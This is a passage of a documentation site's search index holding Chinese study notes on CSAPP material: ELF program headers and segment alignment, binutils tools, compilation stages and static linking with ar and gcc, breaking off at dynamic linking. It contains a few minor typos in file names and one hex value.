\u53ef\u6267\u884c\u6587\u4ef6\u88ab\u8bbe\u8ba1\u5f97\u5f88\u5bb9\u6613\u52a0\u8f7d\u5230\u5185\u5b58\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u7684\u8fde\u7eed\u7684\u7247\uff08chunk\uff09\u88ab\u6620\u5c04\u5230\u8fde\u7eed\u7684\u5185\u5b58\u6bb5\u3002\u7a0b\u5e8f\u5934\u90e8\u8868\uff08program header table\uff09\u63cf\u8ff0\u4e86\u8fd9\u79cd\u6620\u5c04\u5173\u7cfb\u3002</p> <p>\u4e0b\u9762\u5c55\u793a\u53ef\u6267\u884c\u6587\u4ef6 prog \u7684\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u662f\u7531 OBJDUMP \u663e\u793a\u7684\uff1a</p> <pre><code>Read-only code segment\nLOAD off    0x0000000000000000 vaddr 0x0000000000400000 paddr 0x0000000000400000 align 2**21\n     filesz 0x000000000000069c memsz 0x00000oo000o0069c flags r-x\n\nRead/write data segment\nLOAD off    0x0000000000000df8 vaddr 0x0000000000600df8 paddr 0x0000000000600df8 align 2**21\n     filesz 0x0000000000000228 memsz 0x0000000000000230 flags rw-\n</code></pre> <p>off\uff1a\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u504f\u79fb\uff1bvaddr/paddr\uff1a\u5185\u5b58\u5730\u5740\uff1balign\uff1a\u5bf9\u9f50\u8981\u6c42\uff1bfilesz\uff1a\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6bb5\u5927\u5c0f\uff1bmemsz\uff1a\u5185\u5b58\u4e2d\u7684\u6bb5\u5927\u5c0f\uff1bflags\uff1a\u8fd0\u884c\u65f6\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u4ece\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u6839\u636e\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u7684\u5185\u5bb9\u521d\u59cb\u5316\u4e24\u4e2a\u5185\u5b58\u6bb5\u3002</p> <ul> <li> <p>\u7b2c 1 \u884c\u548c\u7b2c 2 \u884c\u544a\u8bc9\u6211\u4eec\u7b2c\u4e00\u4e2a\u6bb5\uff08\u4ee3\u7801\u6bb5\uff09\u6709\u8bfb/\u6267\u884c\u8bbf\u95ee\u6743\u9650\uff0c\u5f00\u59cb\u4e8e\u5185\u5b58\u5730\u5740 0x400000 \u5904\uff0c\u603b\u5171\u7684\u5185\u5b58\u5927\u5c0f\u662f 0x69c   \u5b57\u8282\uff0c\u5e76\u4e14\u88ab\u521d\u59cb\u5316\u4e3a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u7684\u5934 0x69c \u4e2a\u5b57\u8282\uff0c\u5176\u4e2d\u5305\u62ec ELF \u5934\u3001\u7a0b\u5e8f\u5934\u90e8\u8868\u4ee5\u53ca .initx.text \u548c .rodata \u8282\u3002</p> </li> <li> <p>\u7b2c 3 \u884c\u548c\u7b2c 4 \u884c\u544a\u8bc9\u6211\u4eec\u7b2c\u4e8c\u4e2a\u6bb5\uff08\u6570\u636e\u6bb5\uff09\u6709\u8bfb/\u5199\u8bbf\u95ee\u6743\u9650\uff0c\u5f00\u59cb\u4e8e\u5185\u5b58\u5730\u5740 0x600df8 \u5904\uff0c\u603b\u7684\u5185\u5b58\u5927\u5c0f\u4e3a 0x230 \u5b57\u8282\uff0c\u5e76\u7528\u4ece\u76ee\u6807\u6587\u4ef6\u4e2d\u504f\u79fb   0xdf8 \u5904\u5f00\u59cb\u7684 .data \u8282\u4e2d\u7684 0x228 \u4e2a\u5b57\u8282\u521d\u59cb\u5316\u3002\u8be5\u6bb5\u4e2d\u5269\u4e0b\u7684 8 \u4e2a\u5b57\u8282\u5bf9\u5e94\u4e8e\u8fd0\u884c\u65f6\u5c06\u88ab\u521d\u59cb\u5316\u4e3a 0 \u7684 .bss \u6570\u636e\u3002</p> </li> </ul> <p>\u5bf9\u4e8e\u4efb\u4f55\u6bb5 s\uff0c\u94fe\u63a5\u5668\u5fc5\u987b\u9009\u62e9\u4e00\u4e2a\u8d77\u59cb\u5730\u5740 vaddr\uff0c\u4f7f\u5f97 \\(vaddr\\ mod\\ align = off\\ mod\\ align\\)</p> <ul> <li>off \u662f\u76ee\u6807\u6587\u4ef6\u4e2d\u6bb5\u7684\u7b2c\u4e00\u4e2a\u8282\u7684\u504f\u79fb\u91cf</li> <li>align \u662f\u7a0b\u5e8f\u5934\u90e8\u4e2d\u6307\u5b9a\u7684\u5bf9\u9f50 \\(2^{21} = 0x200000\\)\u3002</li> </ul> <p>\u4e0a\u4f8b\u7684\u6570\u636e\u6bb5\u4e2d\uff1a\\(vaddr\\ mod\\ align = 0x600df8\\ mod\\ 0x200000 = 0xdf8\\)</p> <p>\u4ee5\u53ca\uff1a\\(off\\ mod\\ align = 0xdf8\\ mod\\ 0x200000 = 0xdf8\\)</p> <p>\u8fd9\u4e2a\u5bf9\u9f50\u8981\u6c42\u662f\u4e00\u79cd\u4f18\u5316\uff0c\u4f7f\u5f97\u5f53\u7a0b\u5e8f\u6267\u884c\u65f6\uff0c\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6bb5\u80fd\u591f\u5f88\u6709\u6548\u7387\u5730\u4f20\u9001\u5230\u5185\u5b58\u4e2d\u3002\u539f\u56e0\u6709\u70b9\u513f\u5fae\u5999\uff0c\u5728\u4e8e\u865a\u62df\u5185\u5b58\u7684\u7ec4\u7ec7\u65b9\u5f0f\uff0c\u5b83\u88ab\u7ec4\u7ec7\u6210\u4e00\u4e9b\u5f88\u5927\u7684\u3001\u8fde\u7eed\u7684\u3001\u5927\u5c0f\u4e3a 2 \u7684\u5e42\u7684\u5b57\u8282\u7247\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_3","title":"\u5904\u7406\u76ee\u6807\u6587\u4ef6\u7684\u5de5\u5177","text":"<p>\u5728 Linux \u7cfb\u7edf\u4e2d\u6709\u5927\u91cf\u53ef\u7528\u7684\u5de5\u5177\u53ef\u4ee5\u5e2e\u52a9\u4f60\u7406\u89e3\u548c\u5904\u7406\u76ee\u6807\u6587\u4ef6\u3002\u7279\u522b\u5730\uff0cGNU binutils \u5305\u5c24\u5176\u6709\u5e2e\u52a9\uff0c\u800c\u4e14\u53ef\u4ee5\u8fd0\u884c\u5728\u6bcf\u4e2a Linux \u5e73\u53f0\u4e0a\u3002</p> <ul> <li>AR\uff1a\u521b\u5efa\u9759\u6001\u5e93\uff0c\u63d2\u5165\u3001\u5220\u9664\u3001\u5217\u51fa\u548c\u63d0\u53d6\u6210\u5458\u3002</li> <li>STRINGS\uff1a\u5217\u51fa\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4e2d\u6240\u6709\u53ef\u6253\u5370\u7684\u5b57\u7b26\u4e32\u3002</li> <li>STRIP\uff1a\u4ece\u76ee\u6807\u6587\u4ef6\u4e2d\u5220\u9664\u7b26\u53f7\u8868\u4fe1\u606f\u3002</li> <li>NM\uff1a\u5217\u51fa\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u7b26\u53f7\u8868\u4e2d\u5b9a\u4e49\u7684\u7b26\u53f7\u3002</li> <li>SIZE\uff1a\u5217\u51fa\u76ee\u6807\u6587\u4ef6\u4e2d\u8282\u7684\u540d\u5b57\u548c\u5927\u5c0f\u3002</li> <li>READELF\uff1a\u663e\u793a\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u5b8c\u6574\u7ed3\u6784\uff0c\u5305\u62ec ELF \u5934\u4e2d\u7f16\u7801\u7684\u6240\u6709\u4fe1\u606f\u3002\u5305\u542b SIZE \u548c NM \u7684\u529f\u80fd\u3002</li> <li>OBJDUMP\uff1a\u6240\u6709\u4e8c\u8fdb\u5236\u5de5\u5177\u4e4b\u6bcd\u3002\u80fd\u591f\u663e\u793a\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4e2d\u6240\u6709\u7684\u4fe1\u606f\u3002\u5b83\u6700\u5927\u7684\u4f5c\u7528\u662f\u53cd\u6c47\u7f16 .text \u8282\u4e2d\u7684\u4e8c\u8fdb\u5236\u6307\u4ee4\u3002</li> </ul> <p>Linux \u7cfb\u7edf\u4e3a\u64cd\u4f5c\u5171\u4eab\u5e93\u8fd8\u63d0\u4f9b\u4e86 LDD \u7a0b\u5e8f\uff1a</p> <ul> <li>LDD\uff1a\u5217\u51fa\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u5728\u8fd0\u884c\u65f6\u6240\u9700\u8981\u7684\u5171\u4eab\u5e93\u3002</li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_4","title":"\u7f16\u8bd1\u4e0e\u94fe\u63a5","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#c-example","title":"C Example","text":"<p>\u4ee5 C \u8bed\u8a00\u7a0b\u5e8f <code>hello.c</code> \u4e3a\u4f8b\uff08\u53c2\u8003 CSAPP\uff09\uff1a</p> <p></p> <ul> <li> <p>\u9884\u5904\u7406\u9636\u6bb5\u3002 \u9884\u5904\u7406\u5668\uff08cpp\uff09\u6839\u636e\u4ee5\u5b57\u7b26 ## \u5f00\u5934\u7684\u547d\u4ee4\uff0c\u4fee\u6539\u539f\u59cb\u7684 C \u7a0b\u5e8f\u3002\u6bd4\u5982 hello.c \u4e2d\u7b2c 1 \u884c\u7684<code>#include &lt;stdio.h&gt;</code>   \u547d\u4ee4\u544a\u8bc9\u9884\u5904\u7406\u5668\u8bfb\u53d6\u7cfb\u7edf\u5934\u6587\u4ef6 stdio.h \u7684\u5185\u5bb9\uff0c\u5e76\u628a\u5b83\u76f4\u63a5\u63d2\u5165\u7a0b\u5e8f\u6587\u672c\u4e2d\u3002\u7ed3\u679c\u5c31\u5f97\u5230\u4e86\u53e6\u4e00\u4e2a C \u7a0b\u5e8f\uff0c\u901a\u5e38\u662f\u4ee5 .i \u4f5c\u4e3a\u6587\u4ef6\u6269\u5c55\u540d\u3002</p> </li> <li> <p>\u7f16\u8bd1\u9636\u6bb5\u3002 \u7f16\u8bd1\u5668\uff08ccl\uff09\u5c06\u6587\u672c\u6587\u4ef6 hello.i \u7ffb\u8bd1\u6210\u6587\u672c\u6587\u4ef6 hello.s\uff0c\u5b83\u5305\u542b\u4e00\u4e2a \u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u3002\u8be5\u7a0b\u5e8f\u5305\u542b\u51fd\u6570 main   \u7684\u5b9a\u4e49\uff0c\u5982\u4e0b\u6240\u793a \u2236</p> </li> </ul> <pre><code>main:\n    subq $8, %rsp\n    movl $.LC0, %edi\n    call puts\n    movl $0, %eax\n    addq $8, %rsp\n    ret\n</code></pre> <p>\u5b9a\u4e49\u4e2d 2 \uff5e 7 \u884c\u7684\u6bcf\u6761\u8bed\u53e5\u90fd\u4ee5\u4e00\u79cd\u6587\u672c\u683c\u5f0f\u63cf\u8ff0\u4e86\u4e00\u6761\u4f4e\u7ea7\u673a\u5668\u8bed\u8a00\u6307\u4ee4\u3002\u6c47\u7f16\u8bed\u8a00\u662f\u975e\u5e38\u6709\u7528\u7684\uff0c\u56e0\u4e3a\u5b83\u4e3a\u4e0d\u540c\u9ad8\u7ea7\u8bed\u8a00\u7684\u4e0d\u540c\u7f16\u8bd1\u5668\u63d0\u4f9b\u4e86\u901a\u7528\u7684\u8f93\u51fa\u8bed\u8a00\u3002\u4f8b\u5982\uff0cC   \u7f16\u8bd1\u5668\u548c Fortran \u7f16\u8bd1\u5668\u4ea7\u751f\u7684\u8f93\u51fa\u6587\u4ef6\u7528\u7684\u90fd\u662f\u4e00\u6837\u7684\u6c47\u7f16\u8bed\u8a00\u3002</p> <ul> <li>\u6c47\u7f16\u9636\u6bb5\u3002 \u63a5\u4e0b\u6765\uff0c\u6c47\u7f16\u5668\uff08as\uff09\u5c06 hello.s \u7ffb\u8bd1\u6210\u673a\u5668\u8bed\u8a00\u6307\u4ee4\uff0c\u628a\u8fd9\u4e9b\u6307\u4ee4\u6253\u5305\u6210\u4e00\u79cd\u53eb\u505a \u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u7a0b\u5e8f\uff08relocatable   object program\uff09\u7684\u683c\u5f0f\uff0c\u5e76\u5c06\u7ed3\u679c\u4fdd\u5b58\u5728\u76ee\u6807\u6587\u4ef6 hello.o \u4e2d\u3002hello.o \u6587\u4ef6\u662f\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5b83\u5305\u542b\u7684 17 \u4e2a\u5b57\u8282\u662f\u51fd\u6570 main   \u7684\u6307\u4ee4\u7f16\u7801\u3002\u5982\u679c\u6211\u4eec\u5728\u6587\u672c\u7f16\u8f91\u5668\u4e2d\u6253\u5f00 hello.o \u6587\u4ef6\uff0c\u5c06\u770b\u5230\u4e00\u5806\u4e71\u7801\u3002</li> </ul> <p>\u6ce8\u610f <code>.o</code> \u53c8\u88ab\u79f0\u4e3a\u76ee\u6807\u4ee3\u7801\u6587\u4ef6\uff0c\u662f\u673a\u5668\u4ee3\u7801\u7684\u4e00\u79cd\u5f62\u5f0f\uff0c\u5305\u542b\u6240\u6709\u6307\u4ee4\u7684\u4e8c\u8fdb\u5236\u8868\u793a\uff0c\u4f46\u8fd8\u6ca1\u6709\u586b\u5165\u5168\u5c40\u503c\u7684\u5730\u5740\u3002\uff08CSAPP P113\uff09</p> <ul> <li>\u94fe\u63a5\u9636\u6bb5\u3002 \u8bf7\u6ce8\u610f\uff0chello \u7a0b\u5e8f\u8c03\u7528\u4e86 printf \u51fd\u6570\uff0c\u5b83\u662f\u6bcf\u4e2a C \u7f16\u8bd1\u5668\u90fd\u63d0\u4f9b\u7684\u6807\u51c6 C \u5e93\u4e2d\u7684\u4e00\u4e2a\u51fd\u6570\u3002printf \u51fd\u6570\u5b58\u5728\u4e8e\u4e00\u4e2a\u540d\u4e3a   printf.o \u7684\u5355\u72ec\u7684\u9884\u7f16\u8bd1\u597d\u4e86\u7684\u76ee\u6807\u6587\u4ef6\u4e2d\uff0c\u800c\u8fd9\u4e2a\u6587\u4ef6\u5fc5\u987b\u4ee5\u67d0\u79cd\u65b9\u5f0f\u5408\u5e76\u5230\u6211\u4eec\u7684 hello.o \u7a0b\u5e8f\u4e2d\u3002\u94fe\u63a5\u5668\uff08ld\uff09\u5c31\u8d1f\u8d23\u5904\u7406\u8fd9\u79cd\u5408\u5e76\u3002\u7ed3\u679c\u5c31\u5f97\u5230   hello \u6587\u4ef6\uff0c\u5b83\u662f\u4e00\u4e2a \u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\uff08\u6216\u8005\u7b80\u79f0\u4e3a \u53ef\u6267\u884c\u6587\u4ef6\uff09\uff0c\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u7531\u7cfb\u7edf\u6267\u884c\u3002</li> </ul> <p>\u6b64\u5904\u4ec5\u4ecb\u7ecd Windows \u548c Linux \u4e0b\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002</p> <p>Windows\uff1aPE\uff08Portable Executable\uff09</p> <ul> <li>\u53ef\u6267\u884c\u7a0b\u5e8f\u6587\u4ef6\uff1a<code>.exe</code></li> <li>\u52a8\u6001\u94fe\u63a5\u5e93\u6587\u4ef6\uff1a<code>.dll</code></li> <li>\u9759\u6001\u94fe\u63a5\u5e93\u6587\u4ef6\uff1a<code>.lib</code></li> </ul> <p>LInux\uff1aELF\uff08Executable and Linkable Format\uff09</p> <ul> <li>\u53ef\u6267\u884c\u7a0b\u5e8f\u6587\u4ef6\uff1a<code>.out</code></li> <li>\u52a8\u6001\u94fe\u63a5\u5e93\u6587\u4ef6\uff1a<code>.so</code></li> <li>\u9759\u6001\u94fe\u63a5\u5e93\u6587\u4ef6\uff1a<code>.a</code></li> </ul>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_5","title":"\u9759\u6001\u94fe\u63a5\u4e0e\u9759\u6001\u5e93","text":"<p>\u9759\u6001\u94fe\u63a5\uff1a\u7c7b\u4f3c Linux LD \u8fd9\u6837\u7684\u9759\u6001\u8fde\u63a5\u5668\u4ee5 \u4e00\u7ec4\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6 \u548c\u547d\u4ee4\u53c2\u6570\u4f5c\u4e3a\u8f93\u5165\uff0c\u751f\u6210\u4e00\u4e2a\u5b8c\u5168\u94fe\u63a5\u7684\u3001\u53ef\u4ee5\u52a0\u8f7d\u548c\u8fd0\u884c\u7684\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4f5c\u4e3a\u8f93\u51fa\u3002\u6ce8\u610f \u9759\u6001\u94fe\u63a5\u751f\u6210\u7684\u6587\u4ef6\u5305\u542b\u4e86\u8fd0\u884c\u65f6\u6240\u9700\u7684\u5168\u90e8\u4ee3\u7801\uff0c\u5f53\u591a\u4e2a\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u8c03\u7528\u76f8\u540c\u7684\u51fd\u6570\u65f6\uff0c\u5185\u5b58\u4e2d\u5c31\u4f1a\u5b58\u5728\u8fd9\u4e2a\u51fd\u6570\u7684\u591a\u4e2a\u62f7\u8d1d\uff0c\u6d6a\u8d39\u5b9d\u8d35\u7684\u5185\u5b58\u8d44\u6e90\u3002</p> <p>\u4e3a\u4e86\u6784\u9020\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u94fe\u63a5\u5668\u5fc5\u987b\u5b8c\u6210\u4e24\u4e2a\u4e3b\u8981\u4efb\u52a1\uff1a</p> <ul> <li>\u7b26\u53f7\u89e3\u6790\uff1a\u76ee\u6807\u6587\u4ef6\u5b9a\u4e49\u548c\u5f15\u7528\u7b26\u53f7\uff0c\u6bcf\u4e2a\u7b26\u53f7\u5bf9\u5e94\u4e8e\u4e00\u4e2a\u51fd\u6570\u3001\u5168\u5c40\u53d8\u91cf\u6216\u9759\u6001\u53d8\u91cf\u3002</li> <li>\u91cd\u5b9a\u4f4d\uff1a\u7f16\u8bd1\u5668\u548c\u6c47\u7f16\u5668\u751f\u6210\u4ece\u5730\u5740 0 \u5f00\u59cb\u7684\u4ee3\u7801\u548c\u6570\u636e\u8282\uff0c\u94fe\u63a5\u5668\u5c06\u591a\u4e2a\u6587\u4ef6\u5408\u5e76\u65f6\uff0c\u9700\u8981\u91cd\u5b9a\u4f4d\u8282\u7684\u5730\u5740\uff0c\u5e76\u4e14\u4fee\u6539\u7b26\u53f7\u5f15\u7528\uff0c\u4f7f\u5176\u6307\u5411\u65b0\u5730\u5740</li> </ul> <p>\u9759\u6001\u5e93\uff1a\u6ce8\u610f\u5230\u8c08\u53ca\u9759\u6001\u94fe\u63a5\u65f6\uff0c\u6211\u4eec\u5047\u8bbe\u94fe\u63a5\u5668\u8bfb\u53d6\u4e00\u7ec4\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\uff0c\u5e76\u5c06\u5176\u94fe\u63a5\u8d77\u6765\u3002\u4f46\u5b9e\u9645\u4e0a\uff0c\u7f16\u8bd1\u7cfb\u7edf\u5747\u4e3a\u63d0\u4f9b\u4e00\u79cd\u673a\u5236\uff0c\u5c06\u6240\u6709\u76f8\u5173\u7684\u76ee\u6807\u6587\u4ef6\u6253\u5305\u6210\u4e3a\u4e00\u4e2a\u5355\u72ec\u7684\u6587\u4ef6\uff0c\u79f0\u4e3a\u9759\u6001\u5e93\uff0c\u9759\u6001\u5e93\u6587\u4ef6\u4ee5 .a \u7ed3\u5c3e\uff0c\u7528\u4f5c\u94fe\u63a5\u5668\u7684\u8f93\u5165\u3002</p> <p>\u4f8b\u5982\uff1a</p> <ul> <li>libc \u662f C \u8bed\u8a00\u7a0b\u5e8f\u5f00\u53d1\u4e2d\u6700\u57fa\u7840\u7684\u5e93\u4e4b\u4e00\uff0c\u4e5f\u662f\u5176\u4ed6\u9ad8\u7ea7\u5e93\u548c\u6846\u67b6\u7684\u57fa\u7840\u3002libc.a \u7ea6 5MB</li> <li>libm \u662f\u6570\u5b66\u5e93\uff0c\u5305\u542b\u4e86\u8bb8\u591a\u6570\u5b66\u51fd\u6570\uff0c\u4f8b\u5982\u4e09\u89d2\u51fd\u6570\u3001\u5bf9\u6570\u51fd\u6570\u3001\u6307\u6570\u51fd\u6570\u7b49\u3002libm.a \u7ea6 2MB</li> </ul> <p>\u672c\u8d28\u4e0a libc.a \u4e2d\u5c31\u662f\u4e00\u7cfb\u5217 .o \u6587\u4ef6\uff0c\u4f46\u5b9e\u9645\u4e0a\u5f53\u4f7f\u7528\u9759\u6001\u5e93\u65f6\uff0c\u94fe\u63a5\u5668\u5c06\u53ea\u590d\u5236\u88ab\u7a0b\u5e8f\u5f15\u7528\u7684\u76ee\u6807\u6a21\u677f\uff0c\u8fd9\u5c31\u51cf\u5c11\u4e86\u9759\u6001\u94fe\u63a5\u540e\u53ef\u6267\u884c\u6587\u4ef6\u5728\u78c1\u76d8\u548c\u5185\u5b58\u4e2d\u7684\u5927\u5c0f\u3002</p> <p>\u6b64\u5916\uff0c\u7a0b\u5e8f\u5458\u53ea\u9700\u8981\u5305\u542b\u8f83\u5c11\u7684\u9759\u6001\u5e93\u5c31\u884c\uff0c\u800c\u4e0d\u9700\u8981\u5305\u542b\u5927\u91cf\u7684 .o \u6587\u4ef6\uff08\u5b9e\u9645\u4e0a\uff0cC \u7f16\u8bd1\u5668\u9a71\u52a8\u603b\u662f\u4f20\u9001 libc.a \u7ed9\u94fe\u63a5\u5668\uff0c\u56e0\u6b64\u4e0d\u9700\u8981\u624b\u52a8\u5f15\u7528\u9759\u6001\u5e93 libc.a\u3002</p> <p>\u5728 Linux \u4e2d\uff0c\u9759\u6001\u5e93\u4ee5\u4e00\u79cd\u79f0\u4e3a \u5b58\u6863\uff08archive\uff09 \u7684\u7279\u6b8a\u6587\u4ef6\u683c\u5f0f\u5b58\u653e\u5728\u78c1\u76d8\u4e2d\uff0c\u672c\u8d28\u4e0a\u662f\u4e00\u7ec4\u8fde\u63a5\u8d77\u6765\u7684\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6\u7684\u96c6\u5408\uff0c\u6709\u4e00\u4e2a\u5934\u90e8\u7528\u6765\u63cf\u8ff0\u6bcf\u4e2a\u6210\u5458\u76ee\u6807\u6587\u4ef6\u7684\u5927\u5c0f\u548c\u4f4d\u7f6e\uff0c\u5b58\u6863\u6587\u4ef6\u540d\u7531\u540e\u7f00.a \u6807\u8bc6\u3002</p> <p>\u4f8b\uff08CSAP 477\uff09\uff1a\u5047\u8bbe\u6709\u4e24\u4e2a\u6587\u4ef6 addvec.c\u3001multvec.c\uff0c\u5206\u522b\u63d0\u4f9b\u52a0\u6cd5\u548c\u51cf\u6cd5\u51fd\u6570\uff0c\u5c06\u5176\u521b\u5efa\u4e3a\u4e00\u4e2a\u9759\u6001\u5e93\uff1a</p> <pre><code>gcc -c advec.c multvec.c  ## -c \u53ea\u6fc0\u6d3b\u9884\u5904\u7406\u3001\u7f16\u8bd1\u548c\u6c47\u7f16\uff0c\u6587\u4ef6\u5c06\u88ab\u6c47\u7f16\u6210\u4e3a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6 .o\nar rcs libvector.a addvec.o multvec.o ## AR \u5de5\u5177\u751f\u6210\u9759\u6001\u5e93\n</code></pre> <p>\u5047\u8bbe vector.h \u5934\u6587\u4ef6\u4e2d\u5b9a\u4e49\u4e86 libvector.a \u4e2d\u7684\u51fd\u6570\u539f\u578b\uff0c\u5982\u679c\u60f3\u4f7f\u7528\u8be5\u5e93\u63d0\u4f9b\u7684\u51fd\u6570\uff1a</p> <pre><code>#include \"vector.h\"\n#include &lt;stdio.h&gt;\nint main()\n{\n  addvec(...); // addvec.c \u4e2d\u7684\u51fd\u6570\n  printf(...);\n  return 0;\n}\n</code></pre> <p>\u6700\u540e\u4e00\u6b65\uff0c\u5728\u94fe\u63a5\u65f6\uff0c\u63d0\u4f9b\u8be5\u9759\u6001\u5e93\uff1a</p> <pre><code>1. gcc -c main2.c\n2. gcc -static -o prog2c main2.o ./libvector.a ## -static \u9009\u9879\u5c06\u7981\u6b62\u4f7f\u7528\u52a8\u6001\u5e93\n2. gcc -static -o prog2c main2.0 -L. -lvector  ## \u7b49\u4ef7\u4e0a\u53e5\n</code></pre> <p>\u9996\u5148\uff0c\u901a\u8fc7\u7b2c\u4e00\u53e5\u5c06 main2.c \u7ecf\u8fc7\u9884\u5904\u7406\u3001\u7f16\u8bd1\u548c\u6c47\u7f16\u5904\u7406\u540e\u6210\u4e3a\u53ef\u91cd\u5b9a\u4f4d\u76ee\u6807\u6587\u4ef6 main.o\uff0c\u63a5\u7740\uff1a</p> <ul> <li>-static\uff1a\u5173\u95ed\u52a8\u6001\u5e93\uff0c\u9ad8\u901f\u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f\uff0c\u94fe\u63a5\u5668\u5e94\u8be5\u6784\u5efa\u4e00\u4e2a\u5b8c\u5168\u94fe\u63a5\u7684\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\uff0c\u5b83\u53ef\u4ee5\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u8fd0\u884c\uff0c\u4e14\u5728\u52a0\u8f7d\u65f6\u65e0\u987b\u66f4\u8fdb\u4e00\u6b65\u7684\u94fe\u63a5</li> <li>-o prog2c\uff1a\u6307\u5b9a\u751f\u6210\u7684\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e3a prog2c</li> <li>-lvector \u53c2\u6570\u662f libvector.a \u7684\u7f29\u5199\uff0c -L. \u53c2\u6570\u544a\u8bc9\u94fe\u63a5\u5668\u5728 \u5f53\u524d\u76ee\u5f55\u4e0b\u67e5\u627e libvector.a</li> </ul> <p></p> <p>\u6ce8\u610f libc.a \u7531 C \u7f16\u8bd1\u5668\u9a71\u52a8\u7a0b\u5e8f\u81ea\u52a8\u4f20\u9001\u7ed9\u94fe\u63a5\u5668\uff0c\u6b64\u5904\u4f1a\u5c06 libc.a \u4e2d\u7684 printf.o \u6a21\u5757\u590d\u5236\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\uff0c\u4ee5\u53ca\u8bb8\u591a C \u8fd0\u884c\u65f6\u7cfb\u7edf\u4e2d\u7684\u5176\u4ed6\u6a21\u5757\u3002</p> <p>\u94fe\u63a5\u5668\u8fd8\u4f1a\u5224\u5b9a mian2.o \u5f15\u7528\u4e86 addvec.o \u5b9a\u4e49\u7684 addvec \u7b26\u53f7\uff0c\u6240\u4ee5\u590d\u5236 addvec.o \u5230\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u4f46\u7a0b\u5e8f\u6ca1\u6709\u5f15\u7528\u4efb\u4f55 multvec.o \u5b9a\u4e49\u7684\u7b26\u53f7\uff0c\u56e0\u6b64 multvec.o \u4e0d\u4f1a\u590d\u5236\u5230\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_6","title":"\u52a8\u6001\u94fe\u63a5\u548c\u5171\u4eab\u5e93","text":"<p>\u52a8\u6001\u94fe\u63a5 \u662f\u76f8\u5bf9\u9759\u6001\u94fe\u63a5\u800c\u8a00\u7684\uff0c\u52a8\u6001\u94fe\u63a5\u6240\u8c03\u7528\u7684\u51fd\u6570\u4ee3\u7801\u5e76\u6ca1\u6709\u88ab\u62f7\u8d1d\u5230\u5e94\u7528\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6587\u4ef6\u4e2d\u53bb\uff0c\u800c\u662f\u4ec5\u4ec5 \u5728\u5176\u4e2d\u52a0\u5165\u4e86\u6240\u8c03\u7528\u51fd\u6570\u7684\u63cf\u8ff0\u4fe1\u606f\uff08\u5f80\u5f80\u662f\u4e00\u4e9b\u91cd\u5b9a\u4f4d\u4fe1\u606f\uff09\u3002\u4ec5\u5f53\u5e94\u7528\u7a0b\u5e8f\u88ab\u88c5\u5165\u5185\u5b58\u5f00\u59cb\u8fd0\u884c\u65f6\uff0c\u624d\u5728\u5e94\u7528\u7a0b\u5e8f\u4e0e\u76f8\u5e94\u7684\u52a8\u6001\u94fe\u63a5\u5e93\u6587\u4ef6\u4e4b\u95f4\u5efa\u7acb\u94fe\u63a5\u5173\u7cfb\u3002</p> <p>\u5171\u4eab\u5e93</p> <p>\u9759\u6001\u5e93\u4e3b\u8981\u5b58\u5728\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ul> 